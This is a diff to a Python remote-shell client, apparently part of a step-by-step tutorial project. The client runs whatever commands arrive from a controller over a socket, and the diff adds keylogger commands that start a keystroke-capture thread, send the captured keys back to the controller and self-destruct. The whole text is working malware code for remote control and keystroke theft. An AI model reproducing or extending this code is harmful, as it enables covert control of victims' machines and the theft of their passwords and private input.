@@ -6,6 +6,7 @@ import sys
 import subprocess
 import threading
 import time
+from keylogger import KeyLogger
 
 ip = '127.0.0.1'
 port = 4141
@@ -16,15 +17,17 @@ print("connected")
 
 def execute_shell():
     while True:
-        data = client.recv(1024).decode()
+        command = client.recv(1024).decode()
 
-        print(f"command received: {data}")
+        print(f"command received: {command}")
 
-        if data == 'quit':
+        if command == 'quit':
+            try: keylog.self_destruct()
+            except: pass
             break
-        elif data[:2] == 'cd':
+        elif command[:2] == 'cd':
             try:
-                os.chdir(data[3:])
+                os.chdir(command[3:])
 
             except:#there wasn't anything after "cd"
                 pass
@@ -32,9 +35,27 @@ def execute_shell():
             finally:
                 client.send(os.getcwd().encode())
 
+        elif command[:12] == 'keylog_start':
+            keylog = KeyLogger()
+            t = threading.Thread(target=keylog.start)
+            t.start()
+            client.send(b'keylog started')
+
+        elif command[:11] == 'keylog_dump':
+            try:
+                keys = keylog.readkeys()
+                print(keys)
+                client.send(keys.encode())
+            except:
+                client.send(b'error')
+
+        elif command[:11] == 'keylog_stop':
+            keylog.self_destruct()
+            client.send(b'keylog stopeed')
+            
         #TODO add elif('s) for keylogger (step 6)
         else:
-            op = subprocess.Popen(data, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
+            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, stdin=subprocess.PIPE)
             client.send(op.stdout.read() + op.stderr.read())
         
         
